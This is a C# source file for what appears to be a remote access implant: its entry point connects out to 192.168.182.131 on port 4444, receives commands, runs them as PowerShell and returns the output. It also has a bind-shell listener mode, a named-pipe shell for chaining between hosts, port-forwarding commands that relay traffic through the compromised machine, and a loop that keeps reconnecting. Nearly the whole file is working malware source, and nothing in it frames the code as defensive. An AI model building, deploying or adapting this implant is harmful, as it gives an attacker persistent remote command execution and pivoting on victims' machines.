using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Globalization;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.IO;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.Security.Principal;
using System.Threading;

namespace myclient
{

    class MyApp
    {
        private string t_message = "";
        private Socket fwSocket = null;
        private bool fwSocket_alive = false;
        private string fwEndPoint = "";

        public static IPEndPoint CreateIPEndPoint(string endPoint)
        {
            string[] ep = endPoint.Split(':');
            if (ep.Length != 2) throw new FormatException("Invalid endpoint format");
            IPAddress ip;
            if (!IPAddress.TryParse(ep[0], out ip))
            {
                throw new FormatException("Invalid ip-adress");
            }
            int port;
            if (!int.TryParse(ep[1], NumberStyles.None, NumberFormatInfo.CurrentInfo, out port))
            {
                throw new FormatException("Invalid port");
            }
            return new IPEndPoint(ip, port);
        }


        public static string MsgPack(string Msg_In)
        {
            string MsgTag_St = "[MYMSST]";
            string MsgTag_Ed = "[MYMSED]";

            return MsgTag_St + Msg_In + MsgTag_Ed;
        }

        public string doRecive(Socket socket) //assume connected
        {
            byte[] bytes = new byte[1024];
            string MsgTag_St = "[MYMSST]";
            string MsgTag_Ed = "[MYMSED]";


            while (true)
            {
                //Console.WriteLine("[DEBUG] " + t_message);
                //Console.WriteLine("[DEBUG] " + t_message.IndexOf(MsgTag_St));
                //Console.WriteLine("[DEBUG] " + t_message.IndexOf(MsgTag_Ed));

                if (t_message.IndexOf(MsgTag_St) >= 0 && t_message.IndexOf(MsgTag_Ed) >= 0)
                {
                    int st_tag = t_message.IndexOf(MsgTag_St);
                    int ed_tag = t_message.IndexOf(MsgTag_Ed);
                    string r_msg = t_message.Substring(st_tag + MsgTag_St.Length, ed_tag - (st_tag + MsgTag_St.Length));
                    //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
                    t_message = t_message.Substring(ed_tag + MsgTag_Ed.Length);
                    //Console.WriteLine("[DEBUG] t_message: " + t_message);
                    //Console.WriteLine("[DEBUG] r_msg: " + r_msg);
                    return r_msg;
                }
                else
                {
                    //Console.WriteLine("[DEBUG] Need to get more ....");
                    int bytesRec = socket.Receive(bytes);
                    t_message = t_message + Encoding.UTF8.GetString(bytes, 0, bytesRec);

                }
            }
        }

        public string doReciveNative(Socket socket) //assume connected
        {
            byte[] fwq_bytes_toresv = new byte[1024];
            string ret_str = "";

            while (true)
            {
                try
                {
                    int length_toresv = socket.Receive(fwq_bytes_toresv);
                    if (length_toresv == 0)
                    {
                        //FINED
                        fwSocket_alive = false;
                        return ret_str;
                    }
                    ret_str = ret_str + Encoding.UTF8.GetString(fwq_bytes_toresv, 0, length_toresv);
                }
                catch (SocketException se)
                {
                    //assume all received in 5s
                    if (se.SocketErrorCode == SocketError.TimedOut)
                    {
                        return ret_str;
                    }
                }
            }
        }//assume connected
        
        private static byte[] ReadPipMessage(PipeStream pipe)
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    //Console.WriteLine("Into pipe read ...");
                    var readBytes = pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);

                }
                while (!pipe.IsMessageComplete);

                return ms.ToArray();
            }
        }

        public void StartServerNative(Object endpoint)
        {

            if (fwSocket_alive)
            {
                Console.WriteLine("fwSocket_alive is true");
                return;
            }

            if (fwSocket != null)
            {
                Console.WriteLine("fwSocket is not null");
                return;
            }
            
            try
            {
                IPEndPoint localEndPoint = CreateIPEndPoint((string)endpoint);
                Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                try
                {
                    listener.Bind(localEndPoint);
                    listener.Listen(1);
                    Console.WriteLine("Waiting for a connection...");
                    fwSocket = listener.Accept();
                    fwSocket.ReceiveTimeout = 5;
                    fwSocket_alive = true;

                    //doMagic(handler, localEndPoint, listener);


                    // Release the socket.  
                    //listener.Shutdown(SocketShutdown.Both);
                    listener.Close();


                }//outer try

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }



        private void doMagic(Socket sender, IPEndPoint remoteEP, Socket listener)
        {

            byte[] bytes = new byte[1024];
            string command_tag;
            string command;

            //init
            PsRun myPsRun = new PsRun();
            myPsRun.init();


            while (true)
            {

                try
                {
                    Console.WriteLine("Waiting for command tag ...");

                    //int bytesRec = sender.Receive(bytes);
                    //command_tag = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                    command_tag = doRecive(sender);
                    Console.WriteLine("Recieved Command tag: {0}", command_tag);
                    byte[] msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
                    int bytesSent = sender.Send(msg);
                    if (bytesSent != msg.Length)
                    {
                        Console.WriteLine("[DEBUG] Something wrong with send");
                    }

                    Console.WriteLine("Finished sending ACK tag");

                    Console.WriteLine("Trying to get commands ... ");
                    //bytesRec = sender.Receive(bytes);
                    //command = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                    command = doRecive(sender);
                    Console.WriteLine("Recieved Command: {0}", command);
                    msg = Encoding.UTF8.GetBytes(MsgPack("COMMAND_SUCCESS"));
                    bytesSent = sender.Send(msg);
                    if (bytesSent != msg.Length)
                    {
                        Console.WriteLine("[DEBUG] Something wrong with send");
                    }


                    //check command
                    if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                    {

                        string psresult = "";
                        try
                        {
                            psresult = myPsRun.doPsRun(command);
                        }
                        catch (Exception e)
                        {

                            psresult = psresult + "[ERROR]: " + e.Message;
                        }


                        Console.WriteLine("[DEBUG] cmd executed ...");
                        msg = Encoding.UTF8.GetBytes(MsgPack(psresult));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send");
                        }
                        Console.WriteLine("Send result finished");

                        //get success ack
                        //bytesRec = sender.Receive(bytes);
                        //string psAck = Encoding.UTF8.GetString(bytes, 0, bytesRec);
                        string psAck = doRecive(sender);
                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                        if (psAck == "PSRUN_SUCCESS")
                        {
                            Console.WriteLine("[PsRun] Success");
                        }
                        else
                        {
                            Console.WriteLine("[PsRun] Failed ...");
                        }

                    }

                    if (command_tag.ToLower() == "fw")
                    {
                        //assume command is ip:port string
                        Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
                        t.Start(command);
                        fwEndPoint = command;
                        Console.WriteLine("[DEBUG] fw executed ...");
                        msg = Encoding.UTF8.GetBytes(MsgPack("FW_SUCCESS"));
                        bytesSent = sender.Send(msg);
                        if (bytesSent != msg.Length)
                        {
                            Console.WriteLine("[DEBUG] Something wrong with send");
                        }
                        Console.WriteLine("Send result finished");

                    }

                    if (command_tag.ToLower() == "fwq")
                    {

                        
                        if (fwSocket != null)
                        {
                            //do single read and write
                            Console.WriteLine("Doing read and write");
                            string str_fwq_msg = doReciveNative(fwSocket);
                            byte[] fwq_msg = Encoding.UTF8.GetBytes(MsgPack(str_fwq_msg));
                            Console.WriteLine("DEBUG:: " + str_fwq_msg);
                            Console.WriteLine("DEBUG:: str_fwq_msg length: " + str_fwq_msg.Length.ToString());
                            Console.WriteLine("DEBUG:: fwq_msg length: " + fwq_msg.Length.ToString());

                            if (str_fwq_msg.Length == 0) //cannot send empty msg
                            {
                                Console.WriteLine("fwSocket FINED, trying to listen for another connection");
                                fwSocket.Shutdown(SocketShutdown.Both);
                                fwSocket.Close();
                                fwSocket = null;

                                Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
                                t.Start(fwEndPoint);
                                Console.WriteLine("[DEBUG] fw executed ...");
                                
                                //send back not ready
                                byte[] fwq_nr_tag = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
                                bytesSent = sender.Send(fwq_nr_tag);
                                Console.WriteLine("FW_NOTREADY Sent");

                                continue;
                            }

                            bytesSent = sender.Send(fwq_msg);
                            Console.WriteLine("Http Get success ...");

                            string fwq_string_tosend = doRecive(sender);
                            Console.WriteLine("Got reponse" + fwq_string_tosend);
                            if (fwSocket_alive)
                            {
                                int length_tosend = fwSocket.Send(Encoding.UTF8.GetBytes(fwq_string_tosend));
                                Console.WriteLine("Response sent");
                            }
                            else
                            {
                                Console.WriteLine("fwSocket doesn't want response ... ");
                                fwSocket.Shutdown(SocketShutdown.Both);
                                fwSocket.Close();
                                fwSocket = null;

                                Thread t = new Thread(new ParameterizedThreadStart(StartServerNative));
                                t.Start(fwEndPoint);
                                Console.WriteLine("[DEBUG] fw executed ...");

                                continue;
                            }
                        }
                        else
                        {
                            Console.WriteLine("Sending not ready");
                            byte[] fwq_nr_tag = Encoding.UTF8.GetBytes(MsgPack("FW_NOTREADY"));
                            bytesSent = sender.Send(fwq_nr_tag);
                            Console.WriteLine("FW_NOTREADY Sent");

                        }
                    }


                    if (command_tag.ToLower() == "exit")
                    {
                        break;
                    }
                }

                catch (SocketException se)
                {
                    Console.WriteLine("SocketException : {0}", se.ToString());
                    //keep reconnect
                    while (true)
                    {
                        try
                        {
                            if (listener == null)
                            {
                                sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                                sender.Connect(remoteEP);
                                break;
                            }
                            else
                            {
                                listener.Listen(1);
                                Console.WriteLine("Waiting for a connection...");
                                sender = listener.Accept();
                                break;
                            }
                        }
                        catch (SocketException se_inner)
                        {
                            Console.WriteLine("Keep trying ...");
                        }
                    }
                }
            }//end of while 
        }


        private void doMagic(PipeStream pipe)
        {

            //init
            PsRun myPsRun = new PsRun();
            myPsRun.init();


            string command_tag;
            string command;

            while (true)
            {
                Console.WriteLine("[*] Waiting for pip message");
                var messageBytes = ReadPipMessage(pipe);
                command_tag = Encoding.UTF8.GetString(messageBytes);
                Console.WriteLine("[*] Tag Received: {0}", command_tag);

                //ack
                byte[] msg = Encoding.UTF8.GetBytes("COMMAND_TAG_SUCCESS");
                pipe.Write(msg, 0, msg.Length);
                Console.WriteLine("[*] Ack Sent..");


                messageBytes = ReadPipMessage(pipe);
                command = Encoding.UTF8.GetString(messageBytes);
                Console.WriteLine("[*] CMD Received: {0}", command);

                //ack
                msg = Encoding.UTF8.GetBytes("COMMAND_SUCCESS");
                pipe.Write(msg, 0, msg.Length);
                Console.WriteLine("[*] Ack Sent..");


                if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                {

                    string psresult = "";
                    try
                    {
                        psresult = myPsRun.doPsRun(command);
                    }
                    catch (Exception e)
                    {
                        psresult = psresult + "[ERROR]: " + e.Message;
                    }


                    try
                    {
                        msg = Encoding.UTF8.GetBytes(psresult);
                        pipe.Write(msg, 0, msg.Length);
                        messageBytes = ReadPipMessage(pipe);

                        //ack
                        var psAck = Encoding.UTF8.GetString(messageBytes);
                        Console.WriteLine("[DEBUG] ACK msg: " + psAck);
                        if (psAck == "PSRUN_SUCCESS")
                        {
                            Console.WriteLine("[PsRun] Success");
                        }
                        else
                        {
                            Console.WriteLine("[PsRun] Failed ...");
                        }

                    }
                    catch
                    {
                        Console.WriteLine("[!] Pipe is broken!");
                        //do something to restore
                    }



                }//end of if ps

                if (command_tag.ToLower() == "exit")
                {
                    break;
                }



            }//end of while 

        }

        public void StartPipeClinet()
        {


            try
            {
                Console.WriteLine("[*] Trying connect to server");
                var pipe = new NamedPipeClientStream(".", "namedpipeshell", PipeDirection.InOut);
                pipe.Connect(5000);
                pipe.ReadMode = PipeTransmissionMode.Message;
                Console.WriteLine("[*] Connected to server.");
                doMagic(pipe);



            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

        }

        public void StartPipServer()
        {
            
            try
            {
                var pipe = new NamedPipeServerStream("namedpipeshell", PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Message);
                Console.WriteLine("[*] Waiting for client connection...");
                pipe.WaitForConnection();
                Console.WriteLine("[*] Client connected.");
                
                //ack connecition
                byte[] msg = Encoding.UTF8.GetBytes("PIPE_CONNECTED");
                pipe.Write(msg, 0, msg.Length);

                doMagic(pipe);

            }//end of try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void StartClient()
        {

            //COMMAND_SUCCESS
            //COMMAND_TAG_SUCCESS
            //PSRUN_SUCCESS


            // Connect to a remote device.  
            try
            {

                IPEndPoint remoteEP = CreateIPEndPoint("192.168.182.131:4444");

                // Create a TCP/IP  socket.  
                Socket sender = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);


                // Connect the socket to the remote endpoint. Catch any errors.  
                try
                {
                    sender.Connect(remoteEP);
                    Console.WriteLine("Socket connected to {0}", sender.RemoteEndPoint.ToString());

                    //do the magic
                    doMagic(sender, remoteEP, null);

                    // Release the socket.  
                    sender.Shutdown(SocketShutdown.Both);
                    sender.Close();

                }//outer try

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void StartServer()
        {

            try
            {
                IPEndPoint localEndPoint = CreateIPEndPoint("127.0.0.1:4444");
                Socket listener = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                try
                {
                    listener.Bind(localEndPoint);
                    listener.Listen(1);
                    Console.WriteLine("Waiting for a connection...");
                    Socket handler = listener.Accept();

                    doMagic(handler, localEndPoint, listener);


                    // Release the socket.  
                    //listener.Shutdown(SocketShutdown.Both);
                    listener.Close();


                }//outer try

                catch (Exception e)
                {
                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
                }

            }//init try
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

        }


    }

    public class Program
    {

        public static void Main(string[] args)
        {
            MyApp t_app = new MyApp();
            t_app.StartClient();
            //t_app.StartServer();
            //t_app.StartPipServer();
            //t_app.StartPipeClinet();

        }
    }
}

